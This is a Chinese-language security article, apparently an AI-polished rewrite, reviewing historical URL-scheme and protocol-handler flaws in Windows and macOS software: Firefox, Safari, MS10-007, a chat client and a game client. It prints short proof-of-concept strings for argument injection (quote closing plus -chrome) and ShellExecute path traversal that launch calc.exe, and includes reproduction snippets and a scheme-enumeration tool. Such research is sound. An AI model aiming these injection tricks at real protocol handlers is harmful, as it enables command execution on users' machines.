### 文章优化

#### CVE-2007-3896, CVE-2007-3845 和 CVE-2007-4041
公告中未提供具体利用细节。然而，根据TrendMicro发布的另一份公告，CVE-2007-3896和CVE-2007-3845都是CVE-2007-4041的变体。在Firefox浏览器的问题详情中可以找到多个测试用例，其中一个例子是：
```
Mailto:%
```
由于URL中的`%`符号导致解析错误，最终将其作为路径执行了命令。

#### MS10-007 (CVE-2010-0027)
2010年，类似的漏洞再次被发现。该漏洞允许远程代码执行，当应用程序（如Web浏览器）通过Windows Shell Handler调用ShellExecute API函数时，传入特制数据即可触发。公告明确指出，漏洞的根本原因是ShellExecute函数未能正确处理传入的URL，错误地将其视为路径进行处理。
公开的PoC如下：
```
xyz://www.example.com#://../../C:/windows/system32/calc.exe
```
只需通过ShellExecute*调用即可触发此漏洞。

#### CVE-2007-3670
这是一个影响Firefox和ThunderBird的伪协议参数注入漏洞。Firefox注册了一个名为`FirefoxURL:`的协议：
```
[HKEY_CLASSES_ROOT\FirefoxURL\shell\open\command\@]
"C:\\PROGRA~1\\MOZILL~2\\FIREFOX.EXE" -url “%1″ -requestPending
```
攻击者使用引号闭合来注入任意参数：
```
FirefoxURL://foo" --argument "my value
```
最后通过`-chrome`参数注入恶意脚本，利用Firefox特权域接口实现任意代码执行。

#### CVE-2007-3186
CVE-2007-3670的作者还对当时的Safari Windows版进行了另一种形式的利用：
```
bar | foobar "arg1'>
```
将执行以下命令：
```
"C:\Program Files\My Application\myprotocol.exe" "someserver.com"  bar | foobar "arg1"
```
需要注意的是，在Win32 API中，无论是CreateProcess还是ShellExecute都不支持管道符等CMD特性。唯一的解释是Safari在打开外部URL时使用了system函数。同样地，作者使用`-chrome`参数实现了跨浏览器脚本攻击。

#### 某聊天软件命令执行漏洞
2012年，某即时通讯软件曝出一个远程命令执行漏洞。漏洞成因极有可能是在实现打开网址时没有为其加入`http://`前缀而直接传递给ShellExecute函数，导致域名被系统当成路径名。结合目录遍历技巧，可执行程序安装盘符下的任意命令。但由于可控的参数仅为`lpFile`，无法增加其他参数开关，实际利用效果不理想。
您仍然可以在Windows上通过一行代码复现这个问题：
```c
ShellExecuteW(NULL, L"open", L"www.baidu.com..\\..\\", NULL, NULL, SW_SHOW);
```
这行代码将会打开资源管理器。如果路径指向一个存在的可执行文件，则可以实现命令执行。

**小贴士**
如果您不想安装VS编译环境，可以使用Windows脚本宿主提供的COM接口来实现ShellExecuteEx的功能：
```javascript
var objShell = new ActiveXObject("shell.application");
WScript.Echo("Attach me...");
objShell.ShellExecute("www.baidu.com..\\..\\", "", "", "open", 1);
```
您可以直接使用这个脚本来测试ShellExecute*的特性，或者在开始菜单或运行中输入URL。

#### 某游戏客户端命令执行漏洞
在HITB 2017上，redrain披露了一个通过自定义URL方案执行命令的游戏客户端漏洞：[Attack Surface Extended by URL Schemes](https://conference.hitb.org/hitbsecconf2017ams/materials/D2T2%20-%20Yu%20Hong%20-%20Attack%20Surface%20Extended%20by%20URL%20Schemes.pdf)。
在这个伪协议的一个参数中，期望的输入类型是http(s)协议的网址。但开发者使用`_mbsstr`（是否包含子串）来判断网址的有效性，而不是检查字符串的前缀。最终，利用返回上层路径的方式绕过了关键字检测，成功执行任意路径的可执行文件：
```
qqgameprotocol://shortcut/# URL=c:/windows/system32/http://qq.com/../../calc.exe ICON=3366xs.ico NAME=AAAAAAAA DESC=BBBBB TYPE=1 START=1
```
又是一个由ShellExecute引发的安全问题。

#### 寻找URL协议
对于Android下的BROWSABLE和iOS的universal link，许多漏洞猎手和开发者已经非常熟悉，但在桌面端的关注度相对较少。这可能是由于Web和移动端技术的迅猛发展所致。
在分析CVE-2018-1000006的过程中，有人提出了如何寻找可用的伪协议的问题。前文提到的一些资料中也出现了macOS下通过URL scheme触发的安全问题。下面介绍如何枚举当前系统已注册的URL scheme的方法。
早在2009年出版的《Hacking: The Next Generation》一书中就提到了URL scheme在客户端软件中的攻击场景，并提供了三种平台（Windows、OS X、Linux）下枚举系统已注册伪协议的脚本（或程序）。需要指出的是，书中提到OSX传递URL参数使用了命令行，但目前macOS桌面应用传递URL scheme使用的是Apple Event：
```objc
-(void)applicationWillFinishLaunching:(NSNotification *)aNotification
{
    NSAppleEventManager *appleEventManager = [NSAppleEventManager sharedAppleEventManager];
    [appleEventManager setEventHandler:self
                               andSelector:@selector(handleGetURLEvent:withReplyEvent:)
                             forEventClass:kInternetEventClass andEventID:kAEGetURL];
}
- (void)handleGetURLEvent:(NSAppleEventDescriptor *)event withReplyEvent:(NSAppleEventDescriptor *)replyEvent
{
    NSURL *url = [NSURL URLWithString:[[event paramDescriptorForKeyword:keyDirectObject] stringValue]];
    // handle it
}
```
书中提供的VBS脚本仍可工作，但mac版本需要稍作修改才能通过编译。在此提供一个可用的版本：
```c
/*
  to compile: clang -fmodules schemes.m -o schemes
  then run `./schemes`
*/
#import <Foundation/Foundation.h>
#import <CoreServices/CoreServices.h>
extern OSStatus _LSCopySchemesAndHandlerURLs(CFArrayRef *outSchemes, CFArrayRef *outApps);
extern OSStatus _LSCopyAllApplicationURLs(CFArrayRef *theList);
int main(int argc, const char * argv[]) {
    @autoreleasepool {
        CFArrayRef schemes;
        CFArrayRef apps;
        NSWorkspace *workspace = [NSWorkspace sharedWorkspace];
        _LSCopySchemesAndHandlerURLs(&schemes, &apps);
        for (CFIndex i = 0, count = CFArrayGetCount(schemes); i < count; i++) {
            CFShow(CFArrayGetValueAtIndex(schemes, i));
        }
    }
    return 0;
}
```
可以看到不少有趣的URL，它们是否会有新的漏洞呢？

#### 参考资料
1. [Registering an Application to a URI Scheme](https://msdn.microsoft.com/en-us/library/aa767914(v=vs.85).aspx)
2. [About Dynamic Data Exchange](https://msdn.microsoft.com/en-us/library/windows/desktop/ms648774(v=vs.85).aspx)
3. [Microsoft Security Bulletin MS07-061 - Critical](https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2007/ms07-061)
4. [Microsoft Security Bulletin MS10-007 - Critical](https://technet.microsoft.com/library/security/ms10-007)
5. [URI Use and Abuse](https://www.blackhat.com/presentations/bh-dc-08/McFeters-Rios-Carter/Presentation/bh-dc-08-mcfeters-rios-carter.pdf)
6. [Attack Surface Extended by URL Schemes](https://conference.hitb.org/hitbsecconf2017ams/materials/D2T2%20-%20Yu%20Hong%20-%20Attack%20Surface%20Extended%20by%20URL%20Schemes.pdf)

希望这些信息对您有所帮助！